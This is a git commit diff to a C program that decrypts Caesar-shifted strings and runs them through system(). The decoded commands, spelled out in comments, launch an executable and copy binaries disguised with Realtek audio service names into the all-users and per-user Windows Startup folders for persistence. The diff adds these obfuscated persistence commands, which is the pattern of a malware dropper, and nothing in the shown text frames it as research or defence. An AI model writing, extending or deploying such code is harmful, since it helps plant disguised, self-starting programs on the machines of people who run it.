a77bfc6e5dc35913ae839a516b2ff46f3506ea45
Helheimiss_Windows11 <you@example.com>
2024-11-19 20:46:23 +0300

    update

--- main.c
+++ main.c
@@ -16,9 +16,15 @@ void decrypt(char *text, int shift)
 
 int main()
 {    
+    char path[MAX_PATH];
+    GetModuleFileName(NULL, path, sizeof(path));
+    printf("Полный путь к программе: %s\n", path);
+
     char text_1[] = "uvctv\"TvmCwfWUgtxkegWrf860gzg";
-    char text_2[] = "eqr{\"TvmCwfWUgtxkegWrf860gzg\"^$E<^^Wugtu^^\'wugtpcog\'^^CrrFcvc^^Tqcokpi^^Oketquqhv^^Ykpfqyu^^Uvctv\"Ogpw^^Rtqitcou^^Uvctvwr^^TvmCwfWUgtxkegWrf860gzg^$";
-    char text_3[] = "eqr{\"TvmCwfWUgtxkeg860gzg\"^$E<^^Wugtu^^\'wugtpcog\'^^CrrFcvc^^Tqcokpi^^Oketquqhv^^Ykpfqyu^^Uvctv\"Ogpw^^Rtqitcou^^Uvctvwr^^TvmCwfWUgtxkeg860gzg^$";
+    char text_2[] = "$TvmCwfWUgtxkeg860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
+    char text_3[] = "zeqr{\"$TvmCwfWUgtxkeg860gzg$\"$'CRRFCVC'^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
+    char text_4[] = "zeqr{\"$TvmCwfWUgtxkegWrf860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
+    char text_5[] = "zeqr{\"$TvmCwfWUgtxkegWrf860gzg$\"$'CRRFCVC'^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
 
     decrypt(text_1, 2);
     decrypt(text_2, 2);
@@ -28,9 +34,11 @@ int main()
     //1 start RtkAudUServiceUpd64.exe
     
     system(text_2);
-    //2 copy RtkAudUServiceUpd64.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUServiceUpd64.exe\"
+    //2 xcopy "RtkAudUService64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+    //3 xcopy "RtkAudUService64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
     system(text_3);
-    //3 copy RtkAudUService64.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUService64.exe\"
+    //4 xcopy "RtkAudUServiceUpd64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+    //5 xcopy "RtkAudUServiceUpd64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
     
 
     while (1)
